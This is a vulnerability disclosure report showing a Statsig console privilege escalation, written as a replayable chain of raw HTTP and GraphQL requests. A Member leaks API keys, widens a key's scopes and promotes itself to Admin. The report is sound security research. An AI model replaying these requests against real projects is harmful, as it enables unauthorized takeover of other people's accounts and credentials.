# Statsig Console — a project **Member** reads a key it should not see, raises that key's scopes through an ungated mutation, and promotes itself to **Admin**

**Target:** Statsig Console — `https://console.statsig.com` / `https://statsigapi.net/console/v1`
**VRT:** Broken Access Control (BAC) > Privilege Escalation
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8 (High)** — a Member reaches the Admin role; recommend **P1 / Critical**
**Date:** 2026-09-20
**Tested tenants:** two self-owned projects (`4n6HCY59mDqwX1iSZQtNvx` and `4IM7HTtUKEEctrmIy6IrJm`). No third-party data touched.

---

## Summary

Three authorization decisions in the Statsig console and its management API are each missing the
check that the caller's **role** should provide. Chained, they let the lowest administrative
role — a plain **Member** — take over the project as an **Admin**.

```
1. SEE IT     the Member reads the plaintext value of a company-scoped key
              (the console UI tells them "Contact Project Admin to View Key")
2. RAISE IT   the Member raises that key's scopes to omni_read_write + can_access_keys
              through UpdateSDKKeyScopes, which carries no admin gate
3. BECOME IT  the now-privileged key promotes the Member to Admin via the REST API
```

Statsig does enforce two checks on this surface, and both work correctly:

* a **key-type** gate — `"This endpoint only accepts an active CONSOLE key, but a SERVER key was sent."`
* a **key-scope** gate — `"Read only API keys can not modify entities"`

What is missing is the third one: **nothing checks the role of the human behind the key.** A key is
accepted from a Member who has no right to hold it, its scope can be rewritten by that Member, and
the rewritten key is then treated as admin-equivalent.

---

## Relationship to other reports — and why this is not a duplicate

| | |
| --- | --- |
| `SUBMISSION-STATSIG-REVIEW-BYPASS.md` | Covers the **review/approval control**: `commit` is the one verb in the review family that does not resolve an acting user, so a company-scoped key commits an unapproved review and the change goes live (`200 "Gate review committed successfully"`, `reviewers: []`, `lastModifierEmail: null`). **That report is about the control that is supposed to gate the writes this one demonstrates.** |
| | The `commit` verb, `/reviews`, `skip_config_review` and `on_behalf_of_required` appear nowhere in this document, and the endpoints in this document (`/console/v1/users`, `/settings/roles`, `/roles`, `/settings/reviews`, `/settings/teams`, `/unit_id_types`, `/target_app`) appear nowhere in that one. |
| | The two share **one precondition** — a Member can read a company-scoped key in plaintext and rewrite its scopes through the ungated `UpdateSDKKeyScopes` (steps 1–2 above) — and one root pattern, stated in both: the Console API resolves the credential and never the caller. They are **not** the same broken check: this report's defect is a role/authorization decision on the management surface; the review-bypass defect is a missing acting-user resolution on one review verb. Different routes, different objects, different fixes, different regression tests. |
| | **Filing note for the triager:** if the program prefers to treat "the Console API resolves the credential, not the caller" as one root cause, then `SUBMISSION-STATSIG-REVIEW-BYPASS.md` should be folded in as an **additional impact of this report** rather than closed as a duplicate — the review workflow does not catch the config writes demonstrated here, and that fact is not stated anywhere else. |

---

## Reproduction — the full chain

All steps below are reproduced exactly as run. Every request is raw HTTP so it can be replayed
verbatim. Two self-owned projects are involved and each step is labelled with the one it came from:
**steps 1-4** are from `4IM7HTtUKEEctrmIy6IrJm` (the owner's own project, `m.tayel2004@gmail.com`
Owner + `f73556429@gmail.com` Member), **the capability matrix and blast radius** are from
`4n6HCY59mDqwX1iSZQtNvx` (`mohamed-9499-2@agentmail.to` Owner + `mohamed-9499-3@agentmail.to`
Member). Replaying step 3 in the second project yields a different `userID` for the promoted account,
because it is a different Member in a different project.

### Step 1 — the Member reads a key it should not see

The console UI denies this explicitly: a non-admin viewing `/api_keys` sees masked rows and the
tooltip **"Contact Project Admin to View Key"**. The API does not enforce it.

```
POST /api/graphql?company_id=<COMPANY_ID> HTTP/1.1
Host: console.statsig.com
Cookie: <MEMBER SESSION>
Content-Type: application/json
x-csrf-token: 1
Referer: https://console.statsig.com/<COMPANY_ID>/api_keys

{"id":"d6fcaacbc921668f7e7aa576b9d2ca1e",
 "variables":{"first":100,"keyType":"ALL"}}
```
```
HTTP/1.1 200 OK
{"data":{"viewer_company":{"keys_connection":{"nodes":[
  {"id":"3Be7ZcASE0mePuQOULbYeC","type":"CONSOLE","owner":null,
   "scopes":["omni_read_only"],"description":"just read","value":"console-…"},
  {"id":"162b7UtwoI8kQnPZqFPObn","type":"CONSOLE","owner":null,
   "scopes":["omni_read_write"],"value":"console-…"},
  {"id":"2OTbhpKHv01WRsB9HReXvG","type":"CONSOLE","owner":null,
   "scopes":["can_access_keys","omni_read_only"],"value":"console-…"},
  {"id":"YTNeXAQSJw5h7gnI82sR0","type":"SERVER","owner":null,"value":"secret-…"},
  {"id":"4IMgm3omn3TB3jiQuibnMA","type":"CLIENT","owner":null,"value":"client-…"}
]}}}}
```

**Every key in the project comes back in plaintext** — the company-scoped `CONSOLE` key above, the
`SERVER` key (the project's production server credential) and the `CLIENT` key. The same query also
returns *personal* keys with `owner` set (measured: the Member's own key appears in this response as
`"owner":{"full_name":"Bruno Hunter","id":"<MEMBER USER ID>"}`), so `owner: null` is the marker for
the company-scoped class — not a property of every row.

*Provenance note:* the three company-scoped `CONSOLE` keys in the capture above were minted for this
test by the project Owner (`CreateSDKKey`); they are not produced by the project. A project does
**not** get a company-scoped `CONSOLE` key by default — measured on a second self-owned project, the
console key box is empty at baseline (`n = 0`) and the only company-scoped keys are the `SERVER` and
`CLIENT` SDK defaults with `scopes: []`, which the Console API refuses with `"This endpoint only
accepts an active CONSOLE key, but a SERVER key was sent."`. A Member cannot create one. **The
precondition for this chain is therefore exactly one thing: a company-scoped `CONSOLE` key exists in
the project.** Its scope does not need to be anything in particular — a key created
`["omni_read_only"]` is enough, because the Member rewrites the scope itself in step 2.

The same leak is reachable through the operation the console calls during onboarding:

```
POST /api/graphql?company_id=<COMPANY_ID> HTTP/1.1
Host: console.statsig.com
Cookie: <MEMBER SESSION>
Content-Type: application/json
x-csrf-token: 1

{"id":"63df72f64b17f956f4b3dbe074f407ea","operationName":null,"variables":{}}
```
```
HTTP/1.1 200 OK
{"data":{"viewer_company":{"secret_keys":[{"value":"secret-…","id":"YTNeXAQSJw5h7gnI82sR0"}],
                           "id":"<COMPANY_ID>"}}}
```

### Step 2 — the Member raises that key's scopes (no admin gate)

A read-only key is correctly refused when it tries to **write**:

```
POST /console/v1/users/<MEMBER EMAIL> HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: <the omni_read_only key value from step 1>
Content-Type: application/json

{"role":"Member"}
```
```
HTTP/1.1 401 Unauthorized
{"message":"Read only API keys can not modify entities","status":401}
```

But the **scope of that same key** can be rewritten by the Member, because `UpdateSDKKeyScopes`
carries no admin gate while `CreateSDKKey` and `DeleteSDKKey` on the *same object* both answer
`"Must be admin of project"`:

```
POST /api/graphql?company_id=<COMPANY_ID> HTTP/1.1
Host: console.statsig.com
Cookie: <MEMBER SESSION>
Content-Type: application/json
x-csrf-token: 1
Referer: https://console.statsig.com/<COMPANY_ID>/api_keys

{"id":"ee6fa2efc62906060e04a4e788bc4ac0",
 "variables":{"id":"3Be7ZcASE0mePuQOULbYeC",
              "scopes":["omni_read_write","can_access_keys"],
              "version":1}}
```
```
HTTP/1.1 200 OK
{"data":{"update_sdkkey":{"update_sdkkey_scopes":{
   "id":"3Be7ZcASE0mePuQOULbYeC",
   "scopes":["omni_read_write","can_access_keys"],"version":2}}}}
```
Read-back confirms `["omni_read_write","can_access_keys"]`.

**The asymmetry is the defect.** On the same key object:

| Operation | Result for a Member |
|---|---|
| `CreateSDKKey` | `"Must be admin of project"` |
| `DeleteSDKKey` | `"Must be admin of project"` |
| **`UpdateSDKKeyScopes`** | **`200`** |
| `DeactivateSDKKey` | `200` (no admin gate) |

### Step 3 — the same key now promotes the Member to Admin

Nothing about the key changed except its scope. The same value that returned `401` in step 2 now
writes:

```
GET /console/v1/keys HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: <the SAME key value>
```
```
HTTP/1.1 200 OK                      <- was 403 before the scope write
{"message":"Keys listed successfully.","data":[{"key":"console-…",…}]}
```
```
POST /console/v1/users/<MEMBER EMAIL> HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: <the SAME key value>
Content-Type: application/json

{"role":"Admin"}
```
```
HTTP/1.1 201 Created
{"message":"User updated successfully.",
 "data":{"userID":"3FqWstaxD99nn3N1FP07SC","email":"<MEMBER EMAIL>", …}}
```
```
GET /console/v1/users HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: <the SAME key value>
```
```
HTTP/1.1 200 OK
… {"email":"<MEMBER EMAIL>","role":"admin"} …        <== THE MEMBER IS NOW AN ADMIN
```

### Step 4 — the escalation is made durable

```
POST /console/v1/settings/roles HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: <the SAME key value>
Content-Type: application/json

{"default_project_role":"Admin"}
```
```
HTTP/1.1 201 Created
{"message":"Settings updated successfully.","data":{"default_project_role":"Admin"}}
```

Every future invitee to the project now lands as an Admin, so the escalation outlives removal of the
account that performed it. The audit trail never records a person: the acting principal is
`"updatedBy": "CONSOLE API - console-…"` with `"updatedByUserID": "<the key's id>"` and
`"modifierEmail": null`. Verified on the rows this chain produced — `batch_user_role_update`
("Updated … roles to Admin"), `set_company_default_user_role`, `config_review_commit` and
`config_state_toggle` all carry `modifierEmail: null` and the key id in `updatedByUserID`.

---

**The read-only class key is correctly refused — until the Member rewrites it.** The key exactly as
the administrator issued it (`owner: null`, `["omni_read_only"]`) is refused on every write, by the
product's own scope gate:

```
GET  /console/v1/keys                     -> 403 "Insufficient permissions."
POST /console/v1/users/<member>           -> 401 "Read only API keys can not modify entities"
POST /console/v1/settings/roles           -> 401 "Read only API keys can not modify entities"
```

The same key **value** returns `200` on the scope write in step 2 and `201` on both writes
afterwards. So nothing here is exploitable with a read-only credential as issued — the escalation is
exactly the `200` scope mutation, and that mutation is what the product fails to gate.

## Why the key class matters — and the controls that bound it

The escalation needs a **company-scoped** key (`owner: null`), which is what the console's normal
key page produces when an administrator generates one. A **personal** key (`owner` set — what
`/personal_capi_token` produces) is capped:

```
POST /console/v1/settings/roles   STATSIG-API-KEY: <personal key>
-> 400 {"message":"Must be admin of project"}

POST /console/v1/users/<self> {"role":"Admin"}   STATSIG-API-KEY: <personal key>
-> 400 {"message":"Must be admin of project or project org"}

UpdateSDKKeyScopes {"id":"<personal key>","scopes":["omni_read_write","can_access_keys"]}
-> {"errors":[{"message":"Scopes: Invalid scopes: omni_read_write, can_access_keys"}]}
   read-back: unchanged
```

And a Member cannot create a company-scoped key itself, nor mint one with a personal key:

```
useCreateSDKKeyMutation {"scopes":["omni_read_write"],"owner_id":null}
-> {"errors":[{"message":"Must be admin of project"}]}

POST /console/v1/keys   STATSIG-API-KEY: <personal key>   {"owner_id":null,…}
-> 403 "Insufficient permissions."      (three body shapes tested)
```

**Capability matrix** — same project, same session, only the key differs:

| Call | company-scoped, `["omni_read_write"]` | personal, `["personal_read_write"]` |
|---|---|---|
| `GET  /console/v1/users` | `200` | `200` |
| `GET  /console/v1/company` | `200` | `200` |
| `GET  /console/v1/audit_logs` | `200` | `200` |
| `POST /console/v1/settings/roles` | **`201`** | `400` |
| `POST /console/v1/users/<any> {"role":"Admin"}` | **`201`** | `400` |
| `GET  /console/v1/keys` | `403` → `200` after the scope write | `403` |

**The key-type gate works** (so this is specifically the CONSOLE tier that must not be readable):

```
GET /console/v1/users   STATSIG-API-KEY: <CLIENT key>
-> 403 {"message":"This endpoint only accepts an active CONSOLE key, but a CLIENT key was sent. …"}
GET /console/v1/users   STATSIG-API-KEY: <SERVER key>
-> 403 {"message":"This endpoint only accepts an active CONSOLE key, but a SERVER key was sent. …"}
```

The API rejects a key for being the wrong **kind**; it does not reject it for belonging to the wrong
**person**.

---

## Impact

* A plain **Member** ends up holding the project's highest effective role, with no approval, no
  notification, and no human actor recorded.
* Before that, the same session exposes **every key in the project in plaintext** — including the
  `SERVER` key (the project's production server credential), the `CLIENT` key, and every
  `CONSOLE` key — plus the **full member roster with email addresses** and the **complete
  administrative audit trail** (who invited whom, who changed whose role, who was removed).
* `POST /console/v1/settings/roles {"default_project_role":"Admin"}` returns `201`, so **every
  future invitee lands as an Admin** — the escalation persists after the offending account is
  removed.
* **Durability:** a company-scoped key has **no owner at all** (`owner: null`), and its authority
  does not depend on the role of the human who holds it. Measured: the same key returned `201` on
  `POST /console/v1/users/<member> {"role":"Admin"}` **while that account was a plain Member** (read
  back `member` → `admin`, both the demote and the promote attributed to the key with
  `modifierEmail: null`). The credential does not track any caller's current role, so demoting or
  removing the human who used it does not revoke what it can do — only deleting the key does.
* A **read-only** key — the configuration an administrator would choose precisely to make a
  credential safe to distribute — is one `200` mutation away from being a full management
  credential.

## Blast radius — how many resources the same class rule reaches

The defect is one decision made in the wrong place, so it is worth stating how far it spreads. The
full Console API surface (208 paths / 324 operations, from the vendor's own OpenAPI spec) was walked
with a status pair per endpoint: **(a)** a company-scoped CONSOLE key (`owner: null`,
`["omni_read_write"]`) against **(b)** a personal key owned by the same Member.

Four more admin-gated resources accept the company-scoped key and refuse the personal one:

| Endpoint | company-scoped | personal | Error on the personal key |
|---|---|---|---|
| `POST /console/v1/roles` | **`201`** | `400` | `"Must be admin of project"` |
| `PATCH /console/v1/roles/{id}` | **`200`** | `400` | — |
| `POST /console/v1/settings/reviews` | **`201`** | `400` | `"Must be admin of project"` |
| `POST /console/v1/settings/teams` | **`201`** | `400` | `"Must be admin of project"` |
| `POST /console/v1/unit_id_types` | **`201`** | `400` | `"Must be admin of project"` |
| `POST /console/v1/target_app` | authz **passed** (feature gate: `"Target apps are not available"`) | `400` | `"Must be admin of project"` |

The `roles` rows are the sharpest. A Member can **create and edit role definitions**, and the
permission set the API accepted includes:

```
invitation_access · create_configs · edit_or_delete_configs · launch_to_production · create_teams
```

and `POST /settings/reviews` is the project's **review / approval policy** — the control that is
supposed to gate production changes. A credential the Member should not hold is able to weaken the
approval workflow that would otherwise stop them.

The read half is clean: across **66 read operations** in `experiments`, `gates`, `metrics`,
`segments`, `layers`, `holdouts`, `dashboards` and `alerts`, the status pair is identical for both
key classes — no read differential anywhere. `GET /alerts`, `GET /release_pipelines`,
`GET /release_pipeline_triggers` (`401`) and `GET /users/teams` (`403`) are refused to **both**
classes, which is the correct behaviour and shows the surface is capable of enforcing scope.
`GET /keys` is the exception that proves the gate is scope-based, not role-based: it is refused to
the personal class (`403`) and to a company-scoped key **without** `can_access_keys` (`403`), and it
is granted (`200`) to a company-scoped key **with** that scope - the row in the capability matrix
above. `can_access_keys` gates key management; the caller's role gates nothing.

So the defect is directional and bounded: it applies to **writes on admin-gated resources** and not
to reads, and it is consistent with the single rule already described — **the Console API resolves the
credential and never the caller.** Authority comes from the key's **class**, because only a
company-scoped key may carry the `omni_*` scope family (measured: an Owner-minted *personal* key is
refused the scope — `"Scopes: Invalid scopes: omni_read_write"`), **and** from the key's own **scope
list**, because the same key value returns `401 "Read only API keys can not modify entities"` while
it is `["omni_read_only"]` and `201` once the Member has raised it to `["omni_read_write"]`. The
caller's role is never consulted on either path.

---

## Ceiling — what the promoted Admin cannot do

Stated honestly, to bound the severity:

| Action against the **original Owner** | Result |
|---|---|
| `POST /console/v1/users/<owner> {"role":"Member"}` | `201` returned, but the role is **unchanged** (silent no-op) |
| `POST /console/v1/users/<owner> {"role":"Read Only"}` | `201` returned, role still **unchanged** |
| `POST /console/v1/users/<self> {"role":"Owner"}` | `401 "Must be owner of project"` |
| `DELETE /console/v1/users/<owner>` | `404` — no such route |
| `POST /console/v1/keys/<owner key>/deactivate` | `404` — no such route |
| `DELETE /console/v1/keys/<key value>` | `403 "Insufficient permissions."` **only while the credential lacks `can_access_keys`.** The credential this report's step 2 produces carries it, and with it the same route returns **`200 "Key deleted successfully."`** - the key is gone. Measured on both configurations: class key without `can_access_keys` -> `403`, object unchanged; class key with `can_access_keys` -> `200`, object deleted. |

The Owner retains ultimate control and cannot be removed or demoted through this path. The ceiling is
**full Admin authority over every other member, over project settings, over the administrative
record, and — with the `can_access_keys` scope this report's own step 2 grants — over the project's
other credentials** (a class key deleted both a company-scoped and a personal key with
`200 "Key deleted successfully."`). It is **not** ownership of the project. Note that the "owner key"
row above is not directly testable in our tenant: our Owner holds no personal key, so there is no
Owner-owned credential to attempt to delete.

**Also worth fixing:** the two refused role changes returned `201` ("User updated successfully")
*and* wrote audit-log entries ("Updated … roles to Read Only" / "… to Member") although the role
never changed. The trail records actions that did not take effect, which is misleading during an
incident review.

## Remediation

1. **Check the caller's role, not only the key.** Every `/console/v1` route and every key-management
   mutation should resolve the human behind the credential and evaluate their role against the
   action, exactly as the console session path already does. The key-type and key-scope gates show
   the pattern is understood; the role gate is the missing third one.
2. **Put the admin gate on `UpdateSDKKeyScopes` and `DeactivateSDKKey`** to match `CreateSDKKey`
   and `DeleteSDKKey` on the same object. A credential must not be able to widen its own authority.
3. **Never allow a key to gain a scope its owner's role does not permit.** Clamp the requested scope
   list to the intersection of what the key already has and what its owner may hold.
4. **Apply the existing Read-Only masking predicate to role < Admin** at the `SDKKey.value`
   resolver and its siblings (`ApiKeysBoxQuery` `d6fcaacb…`, `PersonalCAPITokenSectionQuery`
   `0799d4b7…`, `useLoadOnboardingServerKeyQuery` `63df72f6…`), so a Member cannot read the value
   that starts the chain.
5. **Re-evaluate authority on every call** so demoting or removing a user immediately removes what
   their credentials represent.

All steps were performed on our own tenants. Everything was reverted and verified: the key's scopes
were restored to `["omni_read_only"]`, the account's role restored, the default role restored, and
the console key list left at its baseline. No destructive call was made against any real project.

## Evidence

* `escal/user_key_scope_20260920T*.json` — the chain run against the user's own read-only key:
  as-is `401`, the scope write `200`, the same key then `GET /keys 403 -> 200` and
  `POST /users {"role":"Admin"} -> 201`, then the scope restored.
* `escal/user_tenant_chain_20260920T*.json` — the same chain end to end in the second tenant
  (read the key box, demote to Member, promote back to Admin, restore).
* `escal/fullchain_20260919T*.json`, `escal/company_key_reach_20260919T*.json`,
  `escal/leaked_key_test_20260920T*.json` — the company-scoped vs personal matrix, the key-type gate,
  and the server-key behaviour on `api.statsig.com`.
* `escal/personal_chain_20260919T*.json`, `escal/missing_link_20260919T*.json`,
  `escal/merge_test_20260919T*.json` — the negative controls (a personal key cannot be escalated,
  cannot mint a company-scoped key, and cannot change a role).
* `escal/REPRODUCTION-FULL.md` and `escal/BURP-REQUESTS.md` — the same chain as a copy-paste
  runbook and as raw Burp requests.
